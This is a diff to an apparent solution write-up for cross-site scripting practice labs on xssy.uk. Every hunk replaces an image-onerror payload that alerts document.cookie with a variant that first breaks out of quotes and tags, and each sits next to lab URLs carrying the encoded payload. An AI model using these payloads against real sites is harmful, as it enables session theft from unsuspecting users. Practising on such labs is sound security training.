@@ -10,7 +10,7 @@ Source: https://xssy.uk/allLabs
 - **URL Lab**: https://xssy.uk/lab/1
 - **Payload**: 
 ```html
-<img src=x onerror=alert(document.cookie)>
+'";/><img src=x onerror=alert(document.cookie)>
 ```
 - **Full URL**: 
 ```
@@ -23,7 +23,7 @@ https://4ua2fzgq.xssy.uk/target.ftl?name=%3Cimg%20src=x%20onerror=alert(document
 - **URL Lab**: https://xssy.uk/lab/3
 - **Payload**: 
 ```html
-<img src=x onerror=alert(document.cookie)>
+'";/><img src=x onerror=alert(document.cookie)>
 ```
 - **Full URL**: 
 ```
@@ -36,7 +36,7 @@ https://7axgjmar.xssy.uk/target.ftl?name=%3Cimg%20src=x%20onerror=alert(document
 - **URL Lab**: https://xssy.uk/lab/176
 - **Payload**: 
 ```html
-</p><img src=x onerror=alert(document.cookie)>
+'";/></p><img src=x onerror=alert(document.cookie)>
 ```
 - **Full URL**: 
 ```
